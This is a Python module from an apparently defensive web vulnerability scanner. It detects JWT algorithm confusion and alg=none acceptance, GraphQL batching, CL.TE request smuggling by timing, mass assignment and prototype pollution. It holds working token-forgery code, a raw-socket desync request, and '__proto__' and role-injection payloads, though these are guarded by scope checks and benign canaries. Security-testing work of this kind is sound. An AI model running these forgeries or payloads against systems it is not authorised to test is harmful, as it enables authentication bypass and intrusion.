"""Burhan v4.4.0 — Modern Vulnerability Detectors (Axis 13).

The six recent-CVE-class detector families the market demands and most
existing tools do not cover — one module, the same honesty discipline as
every other Burhan engine:

    FAMILY                      FINDING TYPE                  CLASS
    JWT algorithm confusion     jwt_algorithm_confusion        CWE-347 (the RS/HS
                                                              confusion family —
                                                              the node-jose class)
    JWT none-acceptance         jwt_none_acceptance            CWE-347/CWE-287
    GraphQL batching            graphql_batching_enabled       amplification /
                                                              rate-limit-bypass surface
    Request smuggling           http_request_smuggling         CWE-444 — BY TIMING
    Mass assignment             mass_assignment                CWE-915
    Prototype pollution         prototype_pollution            CWE-1321

Design rules (all live-tested by the axis-13 wing):
  1. MANDATORY DIFFERENTIAL — every finding requires the probe to flip
     against a control (accepted vs rejected, persisted vs stripped,
     desync vs below-threshold). No differential -> NO finding, only an
     honest boundary record (TESTED_NEGATIVE / UNTESTABLE /
     OBSERVED_ANOMALY / NOT_DISCOVERED). An anomaly is recorded as a
     boundary, never classified as a finding.
  2. BUDGET HONESTY — when a family's precondition is missing, ZERO probe
     requests are sent (probe_counts proves it; discovery lookups such as
     JWKS fetches are declared discovery, not probes).
  3. DETECTION ONLY — canary values are never real privileges; writes
     happen only on the scan's OWN session objects; the smuggling probe
     rides a raw socket with a BENIGN canary body and NEVER corrupts the
     pipeline (no smuggled second-request prefix, ever — the timing
     differential is the whole claim, quantized to a class).
  4. DETERMINISM — fixed vocabularies, fixed budgets, endpoints processed
     in sorted (url, method) order, canaries derived deterministically
     from the run seed. Measured timings are evidence, digests quantize
     them (the axis-11/12 volatile-fields discipline).
  5. PURE STDLIB — hashlib/hmac/json/socket only. The RSA public key is
     RECONSTRUCTED from the JWKS n/e by a minimal DER encoder; no crypto
     package ever enters the engine (tests may use one — the engine does
     not). No key material is ever stored in a finding: the proof is the
     differential, not token substance.
  6. LAZY WIRING — the orchestrator imports this module lazily (the
     graphql/wsattack pattern); the hot path never imports it at module
     level. Findings leave as CANDIDATEs and go through the SAME fail-closed
     verifier as everything else (VR-29..VR-34).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import socket
import time
from urllib.parse import urlsplit

from .core import Endpoint, Evidence, Finding, FindingStatus, Severity
from .core import pin_transport_address
from .http_engine import RequestEngine, RequestMutation

# ------------------------------------------------------------------ §1 vocabulary
MODERN_TYPES = ("jwt_algorithm_confusion", "jwt_none_acceptance",
                "graphql_batching_enabled", "http_request_smuggling",
                "mass_assignment", "prototype_pollution")

JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json",
              "/.well-known/openid-configuration", "/oauth/discovery/keys")
ASYM_ALGS = ("rs256", "rs384", "rs512", "ps256", "ps384", "ps512",
             "es256", "es384", "es512")
PRIV_NAMES = ("role", "is_admin", "isAdmin", "admin", "account_type",
              "user_type", "privilege", "permissions")
UPDATE_NAMES = ("profile", "settings", "account", "user")
MERGE_NAMES = ("settings", "config", "preferences", "save", "update")
PROTECTED_WORDS = ("protected", "private", "secured", "admin", "api",
                   "account", "session", "dashboard", "member")
AUTHISH = ("login", "signin", "sign-in", "auth", "token", "jwt", "session",
           "apikey", "api-key", "credential", "oauth")
# BFLA-2b round 5 (crAPI live run 41589420101): LOGIN-shaped surfaces are the
# only auth-ish ones that ANSWER a token to a replay (the credentialed
# json_login endpoint AUTH-06 contributes); an auth-word-but-not-login
# surface (crAPI's spec-declared /identity/api/auth/forget-password) answers
# 4xx and starves both differentials. Before the loopback normalization the
# spec's localhost URLs sorted after every 127.0.0.1 URL, so the login won
# the first-AUTHISH pick BY ACCIDENT; normalized, everything is 127.0.0.1
# and forget-password sorts first — the harvest replayed the wrong surface
# and the diagnostic boundary (round 4) named it.
LOGINISH = ("login", "signin", "sign-in")

POST_BUDGET = 8          # max POST endpoints probed by the smuggling family
SMUG_K = 16              # the clipped leftover (bytes) in the desync shape
SMUG_FLOOR_MS = 500.0    # the anti-FP floor
SMUG_RATIO = 3.0         # probe must beat 3x the control
FAMILY_CAPS = {"jwt_algorithm_confusion": 12, "jwt_none_acceptance": 12,
               "graphql_batching_enabled": 4, "http_request_smuggling": 16,
               "mass_assignment": 8, "prototype_pollution": 8}

TOKEN_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{4,}\.([A-Za-z0-9_-]*)")


def derive_canary(seed, namespace: str) -> str:
    """Canary حتمي — نفس البذرة = نفس القيمة؛ نطاق مختلف = قيمة مختلفة."""
    mat = hashlib.sha256(f"{seed if seed is not None else 0}|{namespace}".encode()).hexdigest()
    return "burhan-" + mat[:12]


def _word_hit(url: str, words) -> bool:
    p = urlsplit(url).path.lower()
    return any(w in p for w in words)


def _b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def _b64d(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _jobj(d: dict) -> str:
    return _b64u(json.dumps(d, separators=(",", ":")).encode())


def _decode_seg(seg: str) -> dict:
    try:
        return json.loads(_b64d(seg))
    except Exception:
        return {}


def _ok(r) -> bool:
    return bool(r is not None and not getattr(r, "error", True)
                and r.status and 200 <= r.status < 300)


# ----------------------------------------------------- §2 the RSA PEM reconstruction
def _der_len(x: int) -> bytes:
    if x < 0x80:
        return bytes([x])
    b = x.to_bytes((x.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der(t: int, body: bytes) -> bytes:
    return bytes([t]) + _der_len(len(body)) + body


def rsa_pem_body_from_jwks(n: int, e: int) -> str:
    """جسم PEM العام (بلا درع) من (n, e) — ترميز DER صافٍ بالـstdlib؛
    يطابق حرفياً ما ينتجه أي تنفيذ قياسي لنفس المفتاح (مادة الخلط).
    DER: الأعداد الصحيحة الموجبة ذات البت الأعلى المرفوع تسبقها 0x00."""
    def _int(x: int) -> bytes:
        b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
        return b"\x00" + b if b and b[0] >= 0x80 else b
    rsa_pub = _der(0x30, _der(0x02, _int(n)) + _der(0x02, _int(e)))
    bit = _der(0x03, b"\x00" + rsa_pub)
    alg = _der(0x30, _der(0x06, b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01")
               + _der(0x05, b""))
    spki = _der(0x30, alg + bit)
    b64 = base64.b64encode(spki).decode()
    return "".join(b64[i:i + 64] for i in range(0, len(b64), 64))


# ------------------------------------------------------------- §3 battery state
class ModernResult:
    def __init__(self, findings, boundaries, probe_counts, requests):
        self.findings = findings
        self.boundaries = boundaries
        self.probe_counts = probe_counts
        self.requests = requests


class _St:
    """حالة البطارية: العدّادات والحدود والنتائج — ترتيب حتمي (N8)."""

    def __init__(self, engine: RequestEngine, seed):
        self.engine = engine
        self.seed = seed
        self.findings = []
        self.boundaries = []
        self.counts = {f: {"sent": 0} for f in MODERN_TYPES}
        self.requests = 0

    def send(self, ep: Endpoint, note: str, **kw):
        self.requests += 1
        return self.engine.send(RequestMutation(endpoint=ep, note=note, **kw))

    def probe(self, fam: str, ep: Endpoint, note: str = "", **kw):
        self.counts[fam]["sent"] += 1
        self.requests += 1
        return self.engine.send(
            RequestMutation(endpoint=ep, note=note or f"modern-{fam}", **kw))

    def boundary(self, fam: str, kind: str, detail: str):
        self.boundaries.append({"family": fam, "kind": kind, "detail": detail})

    def find(self, fam: str, severity, ep: Endpoint, parameter: str,
             evidences):
        f = Finding(fam, severity, ep.url, parameter, ep.method, evidences,
                    status=FindingStatus.CANDIDATE)
        f.run_id = getattr(self.engine.bus, "run_id", "")
        self.findings.append(f)
        return f


def probe_counts_of(st: _St) -> dict:
    return {fam: {"sent": st.counts[fam]["sent"], "cap": FAMILY_CAPS[fam]}
            for fam in MODERN_TYPES}


def _sig_not_enforced(st: "_St", prot: Endpoint, ct, hdr: dict,
                       claims: dict, recipe: str, variant: str):
    """CWE-347, the broader class under the confusion/none differentials:
    the CORRUPTED-SIGNATURE control itself was ACCEPTED — the endpoint does
    not verify token signatures at all. Discovered live by run 9 against
    crAPI challenge 15 (both differentials saw the control pass); this is
    the finding that situation deserves. Deduped per endpoint: fam1 and
    fam2 each hold a corrupted-signature control."""
    if any(f.type == "jwt_signature_not_enforced" and f.endpoint_url == prot.url
           for f in st.findings):
        return
    st.find("jwt_signature_not_enforced", Severity.HIGH, prot, "-", [
        Evidence("signature_control_accepted",
                 f"signature not enforced (CWE-347): a token with a CORRUPTED "
                 f"signature (one mid-signature character flipped) was ACCEPTED "
                 f"(HTTP {ct.status}) by the protected endpoint — {variant}. "
                 f"original alg={hdr.get('alg')!r}; claims: {sorted(claims)}",
                 ct.request_id),
        Evidence("probe_recipe", recipe, ct.request_id)])


# --------------------------------------------------------- §4 the JWT families
def _mine_jwt(r) -> str | None:
    if r is None or getattr(r, "error", True) or not getattr(r, "status", 0):
        return None
    hay = (r.body or "") + " ".join(
        f"{k}={v}" for k, v in (r.headers or {}).items()
        if k.lower() == "set-cookie")
    m = TOKEN_RE.search(hay)
    return m.group(0) if m else None


def _discover_pubkey(st: _St, auth_ep: Endpoint):
    """اكتشاف مفتاح RSA العام (إعلان، ليس مجسات): مسارات JWKS الثابتة
    + jwks_uri من وثيقة الاكتشاف. يعيد (جسم PEM، المسار الناجح)."""
    origin = "{0}://{1}".format(*urlsplit(auth_ep.url)[:2])
    for p in JWKS_PATHS:
        r = st.send(Endpoint(url=origin + p, method="GET"), note="modern-jwks")
        if r is None or getattr(r, "error", True) or r.status != 200:
            continue
        try:
            doc = json.loads(r.body or "{}")
        except Exception:
            continue
        if isinstance(doc, dict) and isinstance(doc.get("keys"), list):
            for k in doc["keys"]:
                if (isinstance(k, dict) and k.get("kty") == "RSA"
                        and k.get("n") and k.get("e")):
                    try:
                        n = int.from_bytes(_b64d(str(k["n"])), "big")
                        e = int.from_bytes(_b64d(str(k["e"])), "big")
                    except Exception:
                        continue
                    return rsa_pem_body_from_jwks(n, e), origin + p
        if isinstance(doc, dict) and doc.get("jwks_uri"):
            r2 = st.send(Endpoint(url=str(doc["jwks_uri"]), method="GET"),
                         note="modern-jwks-uri")
            if r2 is not None and not getattr(r2, "error", True) and r2.status == 200:
                try:
                    doc2 = json.loads(r2.body or "{}")
                except Exception:
                    continue
                if isinstance(doc2, dict) and isinstance(doc2.get("keys"), list):
                    for k in doc2["keys"]:
                        if (isinstance(k, dict) and k.get("kty") == "RSA"
                                and k.get("n") and k.get("e")):
                            try:
                                n = int.from_bytes(_b64d(str(k["n"])), "big")
                                e = int.from_bytes(_b64d(str(k["e"])), "big")
                            except Exception:
                                continue
                            return rsa_pem_body_from_jwks(n, e), str(doc["jwks_uri"])
    return None, ""


def _forge_hs256(key_body: str, claims: dict) -> str:
    hp = _jobj({"alg": "HS256", "typ": "JWT"}) + "." + _jobj(claims)
    sig = hmac.new(key_body.encode(), hp.encode(), hashlib.sha256).digest()
    return hp + "." + _b64u(sig)


def _corrupt_sig(tok: str) -> str:
    """تحكم الفساد: قلب حرف في وسط التوقيع — حرف الوسط يحمل 6 بت معنوية
    كلها تهبط في بايتات الفك فتتغير البايتات حتماً. (الحرف الأخير يحمل
    بتّين معنيتين فقط: 'w'→'A' يترك البايت كما هو — أُلتقط حياً في M2.)"""
    a, b, sig = tok.split(".")
    if len(sig) >= 2:
        sig = sig[:1] + ("B" if sig[1] == "A" else "A") + sig[2:]
    else:
        sig = "A" if sig != "A" else "B"
    return a + "." + b + "." + sig


def _none_variant(hdr: dict, claims: dict) -> str:
    h2 = {"alg": "none", "typ": (hdr or {}).get("typ", "JWT")}
    return _jobj(h2) + "." + _jobj(claims) + "."


def _jwt_families(st: _St, eps):
    fam1, fam2 = "jwt_algorithm_confusion", "jwt_none_acceptance"
    # round 5: prefer LOGIN-shaped surfaces for the harvest (stable sort —
    # the first login-shaped candidate in eps order wins; auth-word-only
    # surfaces stay fallbacks, as before, for targets without a login path)
    _auth_cands = [ep for ep in eps if _word_hit(ep.url, AUTHISH)]
    _auth_cands.sort(key=lambda ep: 0 if _word_hit(ep.url, LOGINISH) else 1)
    auth_ep = _auth_cands[0] if _auth_cands else None
    # AUTH-06: the harvest source itself often matches PROTECTED_WORDS
    # ("/auth/api/login" contains "api") — but the differential needs a
    # DIFFERENT protected surface; probing the login endpoint answers
    # identically for forged and corrupt tokens and swallows the signal.
    prot_eps = [ep for ep in eps if ep is not auth_ep
                and _word_hit(ep.url, PROTECTED_WORDS)][:3]
    if auth_ep is None:
        for f in (fam1, fam2):
            st.boundary(f, "NOT_DISCOVERED", "no auth-shaped endpoint in flight")
        return
    if not prot_eps:
        for f in (fam1, fam2):
            st.boundary(f, "NOT_DISCOVERED", "no protected-shaped endpoint in flight")
        return
    prot = prot_eps[0]
    r = st.send(auth_ep, note="modern-jwt-harvest")
    token = _mine_jwt(r)
    if not token:
        # BFLA-2b round 4 (crAPI live runs 41584520525 + 41586612972): the
        # credentialed json_login replay that fed fam1/fam2 in earlier runs
        # (confirmed-positive jwt_signature_not_enforced, run 41436129520)
        # started answering WITHOUT a token once the loopback normalization
        # put the spec's 42 endpoints in scope — the active detect phase now
        # spends ~4700 requests on the target BEFORE this harvest runs. The
        # old one-line note hid the harvest response itself, so the four
        # rounds of live archaeology had to guess. The boundary now carries
        # the observed facts (surface, HTTP status, engine error) so the
        # NEXT artifact names its own cause.
        _st = getattr(r, "status", 0)
        _err = getattr(r, "error", None)
        for f in (fam1, fam2):
            st.boundary(
                f, "UNTESTABLE",
                "no JWT observed in flight (harvest clean): the auth surface "
                f"{auth_ep.url} answered HTTP {_st or 0}"
                + (f" (engine error: {_err})" if _err else "")
                + " — no token to forge with; the replay may be state- or "
                  "rate-dependent after the scan's active phase")
        return
    hdr = _decode_seg(token.split(".")[0])
    claims = _decode_seg(token.split(".")[1])
    alg = str(hdr.get("alg", "")).lower()
    recipe = f"auth={auth_ep.url}; protected={prot.url}"

    # ---- family 1: algorithm confusion (asymmetric issuance only)
    if alg in ASYM_ALGS:
        key_body, jwks_used = _discover_pubkey(st, auth_ep)
        if key_body is None:
            st.boundary(fam1, "UNTESTABLE",
                        "no discoverable RSA public key (all JWKS paths exhausted) "
                        "— zero differential probes sent")
        else:
            forged = _forge_hs256(key_body, claims)
            bad = _corrupt_sig(forged)
            pr = st.probe(fam1, prot, extra_headers={"Authorization": f"Bearer {forged}"})
            ct = st.probe(fam1, prot, extra_headers={"Authorization": f"Bearer {bad}"})
            if _ok(pr) and not _ok(ct):
                st.find(fam1, Severity.HIGH, prot, "-", [
                    Evidence("confusion_differential",
                             f"algorithm confusion (CWE-347): the forged HS256 token "
                             f"signed with the PUBLIC key PEM body as the HMAC secret "
                             f"was ACCEPTED (HTTP {pr.status}) while the corrupted-"
                             f"signature control was REJECTED (HTTP {ct.status}) — "
                             f"the verifier mixes asymmetric and symmetric algorithms. "
                             f"claims: {sorted(claims)}", pr.request_id),
                    Evidence("probe_recipe", recipe + f"; jwks={jwks_used}",
                             pr.request_id)])
            else:
                if _ok(ct):
                    # run-9 class (crAPI challenge 15, live): the control itself
                    # was accepted — signatures are not enforced at all
                    _sig_not_enforced(st, prot, ct, hdr, claims,
                                      recipe + f"; jwks={jwks_used}",
                                      "the confusion differential\u2019s control")
                if _ok(pr) and _ok(ct):
                    st.boundary(fam1, "OBSERVED_ANOMALY",
                                "the protected endpoint accepted the forged token AND "
                                "the corrupted control — the confusion differential "
                                "cannot isolate (both arms passed); the signature "
                                "bypass is reported as jwt_signature_not_enforced")
                elif _ok(ct):
                    st.boundary(fam1, "OBSERVED_ANOMALY",
                                "the corrupted control was ACCEPTED while the forged "
                                "token was not — reported as jwt_signature_not_enforced")
                else:
                    st.boundary(fam1, "TESTED_NEGATIVE",
                                f"the differential held: forged rejected (HTTP "
                                f"{getattr(pr, 'status', 0)}), control rejected (HTTP "
                                f"{getattr(ct, 'status', 0)})")
    else:
        st.boundary(fam1, "NOT_DISCOVERED",
                    f"no asymmetric issuance in flight (alg={alg!r}) — the confusion "
                    "probe covers the RS/PS RSA class")

    # ---- family 2: none-acceptance (needs a SIGNED original)
    sig_seg = token.split(".")[2] if token.count(".") >= 2 else ""
    if not sig_seg:
        st.boundary(fam2, "UNTESTABLE",
                    "the harvested token is already unsigned — the issuance-side "
                    "detector (DETECT-18) governs that case")
        return
    nv = _none_variant(hdr, claims)
    bad_orig = _corrupt_sig(token)
    pr2 = st.probe(fam2, prot, extra_headers={"Authorization": f"Bearer {nv}"})
    ct2 = st.probe(fam2, prot, extra_headers={"Authorization": f"Bearer {bad_orig}"})
    if _ok(pr2) and not _ok(ct2):
        st.find(fam2, Severity.HIGH, prot, "-", [
            Evidence("none_differential",
                     f"none-acceptance (CWE-347/CWE-287): the alg=none token with an "
                     f"EMPTY signature was ACCEPTED (HTTP {pr2.status}) while the "
                     f"corrupted-signature ORIGINAL was REJECTED (HTTP {ct2.status}) "
                     f"— the verifier honors the none algorithm. claims: "
                     f"{sorted(claims)}", pr2.request_id),
            Evidence("probe_recipe", recipe, pr2.request_id)])
    elif _ok(pr2) and _ok(ct2):
        _sig_not_enforced(st, prot, ct2, hdr, claims, recipe,
                          "the none-acceptance differential\u2019s control")
        st.boundary(fam2, "OBSERVED_ANOMALY",
                    "the verifier accepted the none-variant AND the corrupted original "
                    "— it does not verify signatures at all; the signature bypass is "
                    "reported as jwt_signature_not_enforced")
    elif _ok(ct2):
        _sig_not_enforced(st, prot, ct2, hdr, claims, recipe,
                          "the none-acceptance differential\u2019s control")
        st.boundary(fam2, "OBSERVED_ANOMALY",
                    "the corrupted ORIGINAL was ACCEPTED while the none-variant was "
                    "not — reported as jwt_signature_not_enforced")
    else:
        st.boundary(fam2, "TESTED_NEGATIVE",
                    f"the differential held: none-variant rejected (HTTP "
                    f"{getattr(pr2, 'status', 0)}), corrupted original rejected "
                    f"(HTTP {getattr(ct2, 'status', 0)})")


# ------------------------------------------------------ §5 GraphQL batching
def _graphql_batching(st: _St, eps):
    fam = "graphql_batching_enabled"
    gql_eps = [ep for ep in eps
               if (ep.method or "GET").upper() == "POST"
               and _word_hit(ep.url, ("graphql", "gql"))][:2]
    if not gql_eps:
        st.boundary(fam, "NOT_DISCOVERED", "no graphql-shaped POST endpoint in flight")
        return
    for ep in gql_eps:
        single = json.dumps({"query": "{__typename}"})
        r_c = st.probe(fam, ep, body_override=single)
        if not _ok(r_c):
            st.boundary(fam, "UNTESTABLE",
                        f"the endpoint is not usable (single operation HTTP "
                        f"{getattr(r_c, 'status', 0)})")
            continue
        batch = json.dumps([{"query": "{__typename}"}, {"query": "{__typename}"}])
        r_p = st.probe(fam, ep, body_override=batch)
        if _ok(r_p):
            try:
                doc = json.loads(r_p.body or "")
            except Exception:
                doc = None
            if isinstance(doc, list) and len(doc) >= 2:
                st.find(fam, Severity.LOW, ep, "query", [
                    Evidence("batch_differential",
                             f"GraphQL batching enabled: an array of 2 read-only "
                             f"operations returned an ARRAY of {len(doc)} results "
                             f"(HTTP {r_p.status}) while the single-operation control "
                             f"returned one (HTTP {r_c.status}) — N operations execute "
                             f"per request (rate-limit bypass / cost-amplification "
                             f"surface). read-only probes only", r_p.request_id)])
            else:
                st.boundary(fam, "TESTED_NEGATIVE",
                            "accepted but not array-shaped — no batch evidence")
        elif r_p is not None and getattr(r_p, "status", 0) and 400 <= r_p.status < 500:
            st.boundary(fam, "TESTED_NEGATIVE",
                        f"batching rejected (HTTP {r_p.status}) — compliant posture")
        else:
            st.boundary(fam, "UNTESTABLE", "the batch probe failed")


# ------------------------------------------------- §6 request smuggling (timing)
def _raw_post(host: str, port: int, path: str, headers, body: bytes,
              timeout: float, allow_private: bool = False):
    # SSRF fix 2026-10-31 (order 2.2): the raw-socket transport resolves
    # ONCE through the shared gate (every DNS answer validated against the
    # private-address policy, fail-closed) and connects to the pinned
    # address only — never the caller's name.
    pinned, _why = pin_transport_address(host, port, allow_private=allow_private)
    if pinned is None:
        return None, None
    t0 = time.perf_counter()
    try:
        s = socket.create_connection((pinned, port), timeout=timeout)
        try:
            req = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                   + "".join(f"{k}: {v}\r\n" for k, v in headers)
                   + "Connection: close\r\n\r\n").encode() + body
            s.sendall(req)
            buf = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
        finally:
            s.close()
    except OSError:
        return None, None
    ms = (time.perf_counter() - t0) * 1000.0
    status = None
    if buf.startswith(b"HTTP/1.") and b" " in buf:
        try:
            status = int(buf.split(b" ", 2)[1])
        except (ValueError, IndexError):
            status = None
    return ms, status


def _smug_pair(st: _St, ep: Endpoint, canary: str):
    u = urlsplit(ep.url)
    if u.scheme != "http":
        return None, None, None, None, "https endpoint — the raw timing pair is http-only"
    host, port = u.hostname, u.port or 80
    if host is None:
        return None, None, None, None, "unparsable endpoint url"
    allowed = getattr(st.engine.scope, "allowed_domains", None) or []
    ok_host = any(host == d or host.endswith("." + d) for d in allowed)
    # SSRF fix 2026-10-31 (order 2.2): the explicit 127.0.0.1/localhost
    # carve-out is REMOVED — it let the raw-socket timing pair bypass the
    # host allowlist entirely for loopback addresses. Loopback targets now
    # require the host to be in scope AND the scope to carry allow_private
    # (enforced inside _raw_post via pin_transport_address).
    if not ok_host:
        return None, None, None, None, "target host outside the scan scope"
    path = u.path + (("?" + u.query) if u.query else "")
    timeout = min(float(getattr(st.engine, "timeout", 10.0) or 10.0), 15.0)
    # التحكم: طلب POST عادي حميد — يُقاس
    cbody = f"q={canary}-smug-ctrl".encode()
    t_c, st_c = _raw_post(host, port, path,
                          [("Content-Type", "application/x-www-form-urlencoded"),
                           ("Content-Length", str(len(cbody)))],
                          cbody, timeout, allow_private=bool(getattr(st.engine.scope, "allow_private", False)))
    st.requests += 1
    st.counts["http_request_smuggling"]["sent"] += 1
    # المجس: شكل desync — CL يدّعي أقل من الحقيقي بـSMUG_K والجسم chunked كامل
    payload = f"q={canary}-smug-probe".encode()
    chunked = f"{len(payload):x}\r\n".encode() + payload + b"\r\n0\r\n\r\n"
    n = len(chunked) - SMUG_K
    t_p, st_p = _raw_post(host, port, path,
                          [("Content-Type", "application/x-www-form-urlencoded"),
                           ("Content-Length", str(n)),
                           ("Transfer-Encoding", "chunked")],
                          chunked, timeout, allow_private=bool(getattr(st.engine.scope, "allow_private", False)))
    st.requests += 1
    st.counts["http_request_smuggling"]["sent"] += 1
    return t_c, st_c, t_p, st_p, ""


def _smuggling(st: _St, eps):
    fam = "http_request_smuggling"
    post_eps = [ep for ep in eps
                if (ep.method or "GET").upper() == "POST"][:POST_BUDGET]
    if not post_eps:
        st.boundary(fam, "NOT_DISCOVERED", "no POST endpoint in flight")
        return
    for ep in post_eps:
        canary = derive_canary(st.seed, f"smug|{ep.url}")
        t_c, st_c, t_p, st_p, why = _smug_pair(st, ep, canary)
        if t_c is None or t_p is None:
            st.boundary(fam, "UNTESTABLE", why or "the raw pair failed")
            continue
        if st_c is not None and 400 <= st_c < 500:
            st.boundary(fam, "UNTESTABLE",
                        f"the control request itself failed (HTTP {st_c}) — "
                        "endpoint not usable, no timing claim")
            continue
        if st_p is not None and 400 <= st_p < 500 and st_p not in (408, 425):
            st.boundary(fam, "TESTED_NEGATIVE",
                        f"rejected-ambiguous (HTTP {st_p}) — the CL+TE conflict is "
                        f"rejected outright; compliant, no timing claim")
            continue
        threshold = max(SMUG_RATIO * t_c, SMUG_FLOOR_MS)
        if t_p >= threshold:
            st.find(fam, Severity.MEDIUM, ep, "body", [
                Evidence("timing_differential",
                         f"desync timing signature (CWE-444): the CL+TE conflicting "
                         f"request answered in {t_p:.0f}ms (quantized class: desync) "
                         f"vs the control {t_c:.0f}ms — threshold "
                         f"max(3x control, 500ms)={threshold:.0f}ms EXCEEDED with a "
                         f"benign canary body; a smuggling-capable pipeline is "
                         f"INDICATED — pipeline corruption was never attempted "
                         f"(detection-only by design)", ""),
                Evidence("probe_recipe", f"protected={ep.url}", "")])
        else:
            st.boundary(fam, "TESTED_NEGATIVE",
                        f"below-threshold (control {t_c:.0f}ms, probe {t_p:.0f}ms, "
                        f"threshold {threshold:.0f}ms) — no desync claim")


# ------------------------------------------------------ §7 mass assignment
def _state_doc(r):
    if not _ok(r):
        return None
    try:
        return json.loads(r.body or "")
    except Exception:
        return None


def _mass_assignment(st: _St, eps):
    fam = "mass_assignment"
    upd_eps = [ep for ep in eps
               if (ep.method or "GET").upper() == "POST"
               and _word_hit(ep.url, UPDATE_NAMES)][:4]
    if not upd_eps:
        st.boundary(fam, "NOT_DISCOVERED", "no update-shaped endpoint in flight")
        return
    for ep in upd_eps:
        pre = st.send(Endpoint(url=ep.url, method="GET"), note="modern-ma-oracle")
        pre_doc = _state_doc(pre)
        if pre_doc is None:
            st.boundary(fam, "UNTESTABLE",
                        f"no readable state oracle at {ep.url} (HTTP "
                        f"{getattr(pre, 'status', 0)}) — zero probes sent")
            continue
        canary = derive_canary(st.seed, f"ma|{ep.url}")
        priv = PRIV_NAMES[0]           # "role" — deterministic first
        probe_body = json.dumps({"name": "burhan", "email": "s@example.test",
                                 priv: canary})
        r_p = st.probe(fam, ep, body_override=probe_body)
        r_c = st.probe(fam, Endpoint(url=ep.url, method="GET"))
        conf = _state_doc(r_c)
        if _ok(r_p) and isinstance(conf, dict):
            if conf.get(priv) == canary and pre_doc.get(priv) != canary:
                st.find(fam, Severity.HIGH, ep, priv, [
                    Evidence("state_oracle",
                             f"mass assignment (CWE-915): the update carried the "
                             f"privilege-shaped param '{priv}' with the CANARY value "
                             f"(a fabricated non-privilege string — never a real "
                             f"escalation attempt) and the fresh state oracle "
                             f"PERSISTED it: the canary now sits under '{priv}' in "
                             f"the stored object of the scan's OWN session — the "
                             f"server binds arbitrary request fields into the model. "
                             f"probe HTTP {r_p.status}, oracle HTTP {r_c.status}",
                             r_p.request_id),
                    Evidence("probe_recipe", f"protected={ep.url}; priv={priv}",
                             r_p.request_id)])
            else:
                st.boundary(fam, "TESTED_NEGATIVE",
                            "the state oracle did not persist the canary — the "
                            "privilege-shaped param is stripped/ignored (compliant)")
        else:
            st.boundary(fam, "TESTED_NEGATIVE",
                        "the update or the confirming oracle read failed")


# -------------------------------------------------- §8 prototype pollution
def _prototype_pollution(st: _St, eps):
    fam = "prototype_pollution"
    merge_eps = [ep for ep in eps
                 if (ep.method or "GET").upper() == "POST"
                 and _word_hit(ep.url, MERGE_NAMES)][:4]
    if not merge_eps:
        st.boundary(fam, "NOT_DISCOVERED", "no merge-shaped endpoint in flight")
        return
    for ep in merge_eps:
        pre = st.send(Endpoint(url=ep.url, method="GET"), note="modern-pp-oracle")
        pre_doc = _state_doc(pre)
        if pre_doc is None:
            st.boundary(fam, "UNTESTABLE",
                        f"no readable state oracle at {ep.url} (HTTP "
                        f"{getattr(pre, 'status', 0)}) — zero probes sent")
            continue
        canary = derive_canary(st.seed, f"pp|{ep.url}")
        probe_body = json.dumps({"theme": "dark",
                                 "__proto__": {"burhanpp": canary}})
        r_p = st.probe(fam, ep, body_override=probe_body)
        r_c = st.probe(fam, Endpoint(url=ep.url, method="GET"))
        conf = _state_doc(r_c)
        if _ok(r_p) and isinstance(conf, dict):
            if conf.get("burhanpp") == canary and pre_doc.get("burhanpp") != canary:
                st.find(fam, Severity.HIGH, ep, "__proto__", [
                    Evidence("state_oracle",
                             f"prototype pollution (CWE-1321): the merge accepted the "
                             f"'__proto__' key and the shared prototype now carries "
                             f"the canary at a position the client never sent it to — "
                             f"the fresh state oracle reflects it. probe HTTP "
                             f"{r_p.status}, oracle HTTP {r_c.status}. the DOM/browser "
                             f"variant is out of the default engine's scope "
                             f"(--no-browser), declared",
                             r_p.request_id),
                    Evidence("probe_recipe", f"protected={ep.url}", r_p.request_id)])
            else:
                st.boundary(fam, "TESTED_NEGATIVE",
                            "the oracle did not reflect the canary — the merge "
                            "sanitizes __proto__ (compliant)")
        else:
            st.boundary(fam, "TESTED_NEGATIVE",
                        "the merge probe or the confirming oracle read failed")


# ------------------------------------------------------------- §9 the entry point
def run_modern_battery(engine: RequestEngine, endpoints, seed=None) -> ModernResult:
    """مدخل البطارية — يستدعه الـorchestrator كسولاً؛ النقاط بترتيب حتمي."""
    st = _St(engine, seed)
    eps = sorted(endpoints or [], key=lambda e: (e.url, e.method))
    _jwt_families(st, eps)
    _graphql_batching(st, eps)
    _smuggling(st, eps)
    _mass_assignment(st, eps)
    _prototype_pollution(st, eps)
    return ModernResult(st.findings, st.boundaries, probe_counts_of(st),
                        st.requests)


# --------------------------------------------------------- §10 the VR replays
def recipe_of(finding) -> dict:
    out = {}
    for e in (getattr(finding, "evidence", None) or []):
        if getattr(e, "kind", "") == "probe_recipe":
            for part in (e.detail or "").split(";"):
                if "=" in part:
                    k, _, v = part.partition("=")
                    out[k.strip()] = v.strip()
    return out


def _fresh_harvest(engine, auth_url: str):
    # AUTH-06: on a JSON-API login the token only appears when the endpoint
    # is replayed WITH its credential parameters (a bare GET answers 405/401
    # and the fresh harvest — and with it every VR-29/30 re-verification —
    # would fail against exactly the targets this family exists for). The
    # orchestrator stashes the credentialed endpoint on the engine after a
    # successful json_login; credentials stay out of finding evidence.
    ep = getattr(engine, "auth_harvest_endpoint", None)
    if ep is not None and ep.url == auth_url:
        r = engine.send(RequestMutation(endpoint=ep, note="modern-vr-harvest"))
        if _mine_jwt(r):
            return _mine_jwt(r)
    r = engine.send(RequestMutation(endpoint=Endpoint(url=auth_url, method="GET"),
                                    note="modern-vr-harvest"))
    return _mine_jwt(r)


def replay_confusion(engine, finding):
    """VR-29: تفاضل جديد كامل الطريق — حصاد حديث + اكتشاف مفتاح حديث + زوج مزوّر حديث."""
    rec = recipe_of(finding)
    auth, prot = rec.get("auth", ""), rec.get("protected") or getattr(finding, "endpoint_url", "")
    if not auth or not prot:
